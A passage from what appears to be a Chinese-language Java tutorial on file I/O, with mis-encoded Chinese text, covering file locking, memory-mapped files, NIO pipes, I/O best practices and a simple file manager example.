        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileChannel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> FileChannel.open(path, 
                StandardOpenOption.WRITE, StandardOpenOption.CREATE);
             <span class="hljs-type">FileLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> channel.lock()) { <span class="hljs-comment">// è·å–ç‹¬å é”</span>
            
            System.out.println(<span class="hljs-string">"è·å–æ–‡ä»¶é”ï¼Œå¼€å§‹å†™å…¥..."</span>);
            
            <span class="hljs-comment">// å†™å…¥å†…å®¹</span>
            <span class="hljs-type">byte</span>[] bytes = content.getBytes(StandardCharsets.UTF_8);
            <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.wrap(bytes);
            channel.write(buffer);
            
            Thread.sleep(<span class="hljs-number">2000</span>); <span class="hljs-comment">// æ¨¡æ‹Ÿé•¿æ—¶é—´æ“ä½œ</span>
            
            System.out.println(<span class="hljs-string">"å†™å…¥å®Œæˆï¼Œé‡Šæ”¾é”"</span>);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryReadLock</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileChannel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> FileChannel.open(path, StandardOpenOption.READ);
             <span class="hljs-type">FileLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> channel.tryLock(<span class="hljs-number">0</span>, Long.MAX_VALUE, <span class="hljs-literal">true</span>)) { <span class="hljs-comment">// å°è¯•è·å–å…±äº«é”</span>
            
            <span class="hljs-keyword">if</span> (lock != <span class="hljs-literal">null</span>) {
                System.out.println(<span class="hljs-string">"æˆåŠŸè·å–è¯»é”"</span>);
                
                <span class="hljs-comment">// è¯»å–æ–‡ä»¶å†…å®¹</span>
                <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocate(<span class="hljs-number">1024</span>);
                <span class="hljs-keyword">while</span> (channel.read(buffer) &gt; <span class="hljs-number">0</span>) {
                    buffer.flip();
                    System.out.print(StandardCharsets.UTF_8.decode(buffer));
                    buffer.clear();
                }
                
                lock.release();
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"æ–‡ä»¶è¢«é”å®šï¼Œæ— æ³•è¯»å–"</span>);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-15">2. å†…å­˜æ˜ å°„æ–‡ä»¶ï¼šè¶…å¤§æ–‡ä»¶é«˜æ•ˆå¤„ç†</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryMappedFileExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processLargeFile</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileChannel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> FileChannel.open(path, 
                StandardOpenOption.READ, StandardOpenOption.WRITE)) {
            
            <span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> channel.size();
            <span class="hljs-type">long</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-type">long</span> <span class="hljs-variable">chunkSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">100</span>; <span class="hljs-comment">// æ¯æ¬¡æ˜ å°„100MB</span>
            
            <span class="hljs-keyword">while</span> (position &lt; fileSize) {
                <span class="hljs-type">long</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> Math.min(chunkSize, fileSize - position);
                
                <span class="hljs-comment">// æ˜ å°„æ–‡ä»¶çš„ä¸€éƒ¨åˆ†åˆ°å†…å­˜</span>
                <span class="hljs-type">MappedByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> channel.map(
                    FileChannel.MapMode.READ_WRITE, position, size);
                
                <span class="hljs-comment">// åœ¨å†…å­˜ä¸­ç›´æ¥æ“ä½œæ•°æ®</span>
                processBuffer(buffer);
                
                position += size;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processBuffer</span><span class="hljs-params">(ByteBuffer buffer)</span> {
        <span class="hljs-comment">// ç¤ºä¾‹ï¼šæœç´¢ç‰¹å®šå­—èŠ‚æ¨¡å¼</span>
        <span class="hljs-keyword">while</span> (buffer.hasRemaining()) {
            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> buffer.get();
            <span class="hljs-comment">// å¤„ç†é€»è¾‘...</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-16">3. ç®¡é“é€šä¿¡ï¼šçº¿ç¨‹é—´æ•°æ®ä¼ è¾“</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PipeExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">threadCommunication</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// åˆ›å»ºç®¡é“</span>
        <span class="hljs-type">Pipe</span> <span class="hljs-variable">pipe</span> <span class="hljs-operator">=</span> Pipe.open();
        
        <span class="hljs-comment">// å†™å…¥çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">writerThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> (Pipe.<span class="hljs-type">SinkChannel</span> <span class="hljs-variable">sinkChannel</span> <span class="hljs-operator">=</span> pipe.sink()) {
                <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocate(<span class="hljs-number">1024</span>);
                
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Message "</span> + i + <span class="hljs-string">"\n"</span>;
                    buffer.put(message.getBytes());
                    buffer.flip();
                    
                    <span class="hljs-keyword">while</span> (buffer.hasRemaining()) {
                        sinkChannel.write(buffer);
                    }
                    
                    buffer.clear();
                    Thread.sleep(<span class="hljs-number">500</span>);
                }
                
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
            }
        });
        
        <span class="hljs-comment">// è¯»å–çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">readerThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> (Pipe.<span class="hljs-type">SourceChannel</span> <span class="hljs-variable">sourceChannel</span> <span class="hljs-operator">=</span> pipe.source()) {
                <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocate(<span class="hljs-number">1024</span>);
                
                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                    <span class="hljs-type">int</span> <span class="hljs-variable">bytesRead</span> <span class="hljs-operator">=</span> sourceChannel.read(buffer);
                    <span class="hljs-keyword">if</span> (bytesRead &gt; <span class="hljs-number">0</span>) {
                        buffer.flip();
                        System.out.print(StandardCharsets.UTF_8.decode(buffer));
                        buffer.clear();
                    }
                }
                
            } <span class="hljs-keyword">catch</span> (IOException e) {
                e.printStackTrace();
            }
        });
        
        readerThread.start();
        writerThread.start();
    }
}
</code></pre>
<h2 data-id="heading-17">I/Oæœ€ä½³å®è·µä¸æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-18">æœ€ä½³å®è·µæ€»ç»“</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IOBestPractices</span> {
    
    <span class="hljs-comment">// 1. æ€»æ˜¯ä½¿ç”¨try-with-resources</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">goodPractice1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> Files.newBufferedReader(Paths.get(<span class="hljs-string">"file.txt"</span>))) {
            <span class="hljs-comment">// ä½¿ç”¨reader</span>
        }
        
        <span class="hljs-comment">// âŒ é”™è¯¯åšæ³•</span>
        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"file.txt"</span>));
            <span class="hljs-comment">// ä½¿ç”¨reader</span>
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span>) {
                reader.close(); <span class="hljs-comment">// å¯èƒ½å¿˜è®°å…³é—­</span>
            }
        }
    }
    
    <span class="hljs-comment">// 2. é€‰æ‹©åˆé€‚çš„ç¼“å†²åŒºå¤§å°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bufferSizeSelection</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ ¹æ®åœºæ™¯é€‰æ‹©åˆé€‚çš„ç¼“å†²åŒºå¤§å°</span>
        <span class="hljs-type">int</span>[] bufferSizes = {
            <span class="hljs-number">1024</span>,      <span class="hljs-comment">// å°æ–‡ä»¶æˆ–ç½‘ç»œæ“ä½œ</span>
            <span class="hljs-number">8192</span>,      <span class="hljs-comment">// é»˜è®¤æ¨èå€¼</span>
            <span class="hljs-number">65536</span>,     <span class="hljs-comment">// å¤§æ–‡ä»¶å¤„ç†</span>
            <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> <span class="hljs-comment">// è¶…å¤§æ–‡ä»¶æˆ–æ•°æ®åº“æ“ä½œ</span>
        };
        
        <span class="hljs-comment">// æµ‹è¯•æ‰¾åˆ°æœ€ä½³ç¼“å†²åŒºå¤§å°</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> bufferSize : bufferSizes) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">long</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> testBufferPerformance(bufferSize);
                System.out.printf(<span class="hljs-string">"ç¼“å†²åŒºå¤§å° %d: %d ms%n"</span>, bufferSize, time);
            } <span class="hljs-keyword">catch</span> (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    <span class="hljs-comment">// 3. å¤„ç†å¤§æ–‡ä»¶çš„æ­£ç¡®æ–¹å¼</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processLargeFileEfficiently</span><span class="hljs-params">(String inputFile, String outputFile)</span> 
            <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-comment">// ä½¿ç”¨æµå¼å¤„ç†ï¼Œé¿å…ä¸€æ¬¡æ€§åŠ è½½åˆ°å†…å­˜</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> Files.newBufferedReader(Paths.get(inputFile));
             <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> Files.newBufferedWriter(Paths.get(outputFile))) {
            
            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// å¤„ç†æ¯ä¸€è¡Œ</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">processed</span> <span class="hljs-operator">=</span> processLine(line);
                writer.write(processed);
                writer.newLine();
                
                <span class="hljs-comment">// å®šæœŸflushï¼Œä½†ä¸é¢‘ç¹</span>
                <span class="hljs-keyword">if</span> (Math.random() &lt; <span class="hljs-number">0.001</span>) {
                    writer.flush();
                }
            }
        }
    }
    
    <span class="hljs-comment">// 4. å®‰å…¨çš„ä¸´æ—¶æ–‡ä»¶å¤„ç†</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeTempFileUsage</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼ˆä¼šè‡ªåŠ¨åˆ é™¤ï¼‰</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> Files.createTempFile(<span class="hljs-string">"prefix_"</span>, <span class="hljs-string">".tmp"</span>);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶</span>
            Files.write(tempFile, <span class="hljs-string">"ä¸´æ—¶æ•°æ®"</span>.getBytes());
            
            <span class="hljs-comment">// å¤„ç†æ–‡ä»¶...</span>
            
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// ç¡®ä¿ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤</span>
            Files.deleteIfExists(tempFile);
        }
        
        <span class="hljs-comment">// æˆ–è€…ä½¿ç”¨deleteOnExitï¼ˆç¨‹åºé€€å‡ºæ—¶åˆ é™¤ï¼‰</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> File.createTempFile(<span class="hljs-string">"temp"</span>, <span class="hljs-string">".txt"</span>);
        temp.deleteOnExit();
    }
    
    <span class="hljs-comment">// 5. ç›‘æ§I/Oæ“ä½œè¿›åº¦</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyWithProgress</span><span class="hljs-params">(String source, String target)</span> 
            <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-type">long</span> <span class="hljs-variable">totalSize</span> <span class="hljs-operator">=</span> Files.size(Paths.get(source));
        <span class="hljs-type">long</span> <span class="hljs-variable">copied</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(source);
             <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(target)) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>];
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) {
                fos.write(buffer, <span class="hljs-number">0</span>, bytesRead);
                copied += bytesRead;
                
                <span class="hljs-comment">// æ˜¾ç¤ºè¿›åº¦</span>
                <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) copied / totalSize * <span class="hljs-number">100</span>;
                <span class="hljs-keyword">if</span> ((<span class="hljs-type">int</span>) progress % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>) {
                    System.out.printf(<span class="hljs-string">"å¤åˆ¶è¿›åº¦: %.1f%%%n"</span>, progress);
                }
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">testBufferPerformance</span><span class="hljs-params">(<span class="hljs-type">int</span> bufferSize)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// æ€§èƒ½æµ‹è¯•é€»è¾‘</span>
        <span class="hljs-keyword">return</span> System.currentTimeMillis(); <span class="hljs-comment">// ç¤ºä¾‹è¿”å›å€¼</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">processLine</span><span class="hljs-params">(String line)</span> {
        <span class="hljs-comment">// ç¤ºä¾‹å¤„ç†é€»è¾‘</span>
        <span class="hljs-keyword">return</span> line.toUpperCase();
    }
}
</code></pre>
<h2 data-id="heading-19">å®æˆ˜ï¼šå®ç°ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ç®¡ç†å™¨</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleFileManager</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInfo</span> {
        <span class="hljs-keyword">private</span> String name;
        <span class="hljs-keyword">private</span> String type;
        <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> size;
        <span class="hljs-keyword">private</span> LocalDateTime lastModified;
        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isDirectory;
        
        <span class="hljs-comment">// æ„é€ å‡½æ•°ã€getterã€setterçœç•¥</span>
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%-20s %-10s %12d  %s"</span>, 
                name, 
                type, 
                size, 
                lastModified.format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm"</span>)));
        }
    }
    
    <span class="hljs-keyword">public</span> List&lt;FileInfo&gt; <span class="hljs-title function_">listFiles</span><span class="hljs-params">(String directory)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;FileInfo&gt; fileList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">try</span> (Stream&lt;Path&gt; paths = Files.list(Paths.get(directory))) {
            paths.forEach(path -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">FileInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInfo</span>();
                    info.setName(path.getFileName().toString());
                    
                    <span class="hljs-type">BasicFileAttributes</span> <span class="hljs-variable">attrs</span> <span class="hljs-operator">=</span> Files.readAttributes(
                        path, BasicFileAttributes.class);
                    
                    info.setDirectory(attrs.isDirectory());
                    info.setType(attrs.isDirectory() ? <span class="hljs-string">"DIR"</span> : getFileExtension(path));
                    info.setSize(attrs.size());
                    info.setLastModified(LocalDateTime.ofInstant(
                        attrs.lastModifiedTime().toInstant(), ZoneId.systemDefault()));
                    
                    fileList.add(info);
                    
                } <span class="hljs-keyword">catch</span> (IOException e) {
                    System.err.println(<span class="hljs-string">"æ— æ³•è¯»å–æ–‡ä»¶ä¿¡æ¯: "</span> + path);
                }
            });
        }
        
        <span class="hljs-keyword">return</span> fileList.stream()
            .sorted(Comparator.comparing(FileInfo::isDirectory).reversed()
                    .thenComparing(FileInfo::getName))
            .collect(Collectors.toList());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">searchFiles</span><span class="hljs-params">(String directory, String pattern)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">startDir</span> <span class="hljs-operator">=</span> Paths.get(directory);
        
        <span class="hljs-keyword">if</span> (!Files.exists(startDir) || !Files.isDirectory(startDir)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"ç›®å½•ä¸å­˜åœ¨: "</span> + directory);
        }
        
        <span class="hljs-keyword">try</span> (Stream&lt;Path&gt; paths = Files.walk(startDir)) {
            paths.filter(Files::isRegularFile)
                 .filter(path -&gt; path.getFileName().toString().matches(pattern))
                 .forEach(System.out::println);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">calculateDirectorySize</span><span class="hljs-params">(String directory)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">dirPath</span> <span class="hljs-operator">=</span> Paths.get(directory);
        
        <span class="hljs-keyword">try</span> (Stream&lt;Path&gt; paths = Files.walk(dirPath)) {
            <span class="hljs-keyword">return</span> paths.filter(Files::isRegularFile)
                       .mapToLong(path -&gt; {
                           <span class="hljs-keyword">try</span> {
                               <span class="hljs-keyword">return</span> Files.size(path);
                           } <span class="hljs-keyword">catch</span> (IOException e) {
                               <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>;
                           }
                       })
                       .sum();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backupDirectory</span><span class="hljs-params">(String sourceDir, String backupDir)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> Paths.get(sourceDir);
        <span class="hljs-type">Path</span> <span class="hljs-variable">backup</span> <span class="hljs-operator">=</span> Paths.get(backupDir);
        
        <span class="hljs-keyword">if</span> (!Files.exists(backup)) {
            Files.createDirectories(backup);
        }
        
        <span class="hljs-keyword">try</span> (Stream&lt;Path&gt; paths = Files.walk(source)) {
            paths.forEach(sourcePath -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">Path</span> <span class="hljs-variable">targetPath</span> <span class="hljs-operator">=</span> backup.resolve(source.relativize(sourcePath));
                    
                    <span class="hljs-keyword">if</span> (Files.isDirectory(sourcePath)) {
                        Files.createDirectories(targetPath);
                    } <span class="hljs-keyword">else</span> {
                        Files.copy(sourcePath, targetPath, 
                                  StandardCopyOption.REPLACE_EXISTING);
                    }
                    
                } <span class="hljs-keyword">catch</span> (IOException e) {
                    System.err.println(<span class="hljs-string">"å¤‡ä»½å¤±è´¥: "</span> + sourcePath);
                }
            });
        }
    }
    
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getFileExtension</span><span class="hljs-params">(Path path)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> path.getFileName().toString();
        <span class="hljs-type">int</span> <span class="hljs-variable">dotIndex</span> <span class="hljs-operator">=</span> fileName.lastIndexOf(<span class="hljs-string">'.'</span>);
        <span class="hljs-keyword">return</span> (dotIndex == -<span class="hljs-number">1</span>) ? <span class="hljs-string">""</span> : fileName.substring(dotIndex + <span class="hljs-number">1</span>).toUpperCase();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">SimpleFileManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleFileManager</span>();
        
        <span class="hljs-comment">// ç¤ºä¾‹ä½¿ç”¨</span>
        System.out.println(<span class="hljs-string">"=== å½“å‰ç›®å½•æ–‡ä»¶åˆ—è¡¨ ==="</span>);
        List&lt;FileInfo&gt; files = manager.listFiles(<span class="hljs-string">"."</span>);
        files.forEach(System.out::println);
        
        System.out.println(<span class="hljs-string">"\n=== ç›®å½•å¤§å° ==="</span>);
        <span class="hljs-type">long</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> manager.calculateDirectorySize(<span class="hljs-string">"."</span>);
        System.out.println(<span class="hljs-string">"æ€»å¤§å°: "</span> + size + <span class="hljs-string">" å­—èŠ‚ ("</span> + (size/<span class="hljs-number">1024.0</span>/<span class="hljs-number">1024.0</span>) + <span class="hljs-string">" MB)"</span>);
        
        System.out.println(<span class="hljs-string">"\n=== æœç´¢Javaæ–‡ä»¶ ==="</span>);
        manager.searchFiles(<span class="hljs-string">"."</span>, <span class="hljs-string">".*\.java$"</span>);
    }
}
</code></pre>
<h2 data-id="heading-20">æ€»ç»“ä¸è¿›é˜¶å­¦ä¹ </h2>
<h3 data-id="heading-21">æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<ol>
<li><strong>ç†è§£æµçš„æ¦‚å¿µ</strong>ï¼šåŒºåˆ†å­—èŠ‚æµå’Œå­—ç¬¦æµï¼ŒèŠ‚ç‚¹æµå’Œå¤„ç†æµ</li>
<li><strong>æ­£ç¡®ç®¡ç†èµ„æº</strong>ï¼šå§‹ç»ˆä½¿ç”¨try-with-resources</li>
<li><strong>ä½¿ç”¨ç¼“å†²æé«˜æ€§èƒ½</strong>ï¼šç‰¹åˆ«æ˜¯å¤„ç†å¤§æ–‡ä»¶æ—¶</li>
<li><strong>æŒæ¡NIO.2 API</strong>ï¼šPathå’ŒFilesç±»æä¾›äº†æ›´ç°ä»£çš„æ¥å£</li>
<li><strong>å¤„ç†ç¼–ç é—®é¢˜</strong>ï¼šæ˜ç¡®æŒ‡å®šå­—ç¬¦ç¼–ç ï¼Œé¿å…ä¹±ç </li>
</ol>
<h3 data-id="heading-22">å¸¸è§é™·é˜±ä¸è§£å†³æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// é™·é˜±1ï¼šæœªæŒ‡å®šç¼–ç </span>
<span class="hljs-comment">// âŒ</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"file.txt"</span>);
<span class="hljs-comment">// âœ…</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>), StandardCharsets.UTF_8);

<span class="hljs-comment">// é™·é˜±2ï¼šå¿˜è®°flushç¼“å†²åŒº</span>
<span class="hljs-comment">// âŒ æ•°æ®å¯èƒ½ä¸¢å¤±</span>
writer.write(<span class="hljs-string">"data"</span>);
<span class="hljs-comment">// âœ…</span>
writer.write(<span class="hljs-string">"data"</span>);
writer.flush(); <span class="hljs-comment">// æˆ–ä½¿ç”¨try-with-resourcesè‡ªåŠ¨flush</span>

<span class="hljs-comment">// é™·é˜±3ï¼šä¸å¤„ç†ç¬¦å·é“¾æ¥</span>
<span class="hljs-comment">// âŒ å¯èƒ½é™·å…¥å¾ªç¯</span>
Files.walk(dirPath);
<span class="hljs-comment">// âœ…</span>
Files.walk(dirPath, FileVisitOption.FOLLOW_LINKS);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythoné«˜æ•ˆå®ç°Excelä¸TXTæ–‡æœ¬æ–‡ä»¶æ•°æ®è½¬æ¢æŒ‡å—]]></title>    <link>https://juejin.cn/post/7582358932027392015</link>    <guid>https://juejin.cn/post/7582358932027392015</guid>    <pubDate>2025-12-11T07:36:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582358932027392015" data-draft-id="7582246395986772002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythoné«˜æ•ˆå®ç°Excelä¸TXTæ–‡æœ¬æ–‡ä»¶æ•°æ®è½¬æ¢æŒ‡å—"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-11T07:36:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«™å¤§çˆ·IP"/> <meta itemprop="url" content="https://juejin.cn/user/2905353241759261"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
